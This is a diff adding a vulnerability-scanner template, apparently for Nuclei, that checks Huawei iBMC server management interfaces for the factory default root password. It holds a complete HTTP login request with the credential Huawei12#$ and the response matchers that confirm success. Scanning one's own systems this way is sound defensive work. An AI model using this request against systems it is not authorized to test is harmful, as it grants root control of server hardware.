@@ -1,0 +1,29 @@
+﻿id: HUAWEI-iBMC-default-login
+info:
+    author: Str1am
+    name: 华为服务器智能管理系统默认口令
+    severity: high
+    tags:
+        - iBMC
+        - Oce
+        - huawei
+        - HuaWei-iBMC
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          part: body
+          type: word
+          words:
+            - AuthUser
+            - AddSession
+      matchers-condition: and
+      raw:
+        - |
+          POST /bmc/php/processparameter.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          check_pwd=Huawei12%23%24&logtype=0&user_name=root&func=AddSession
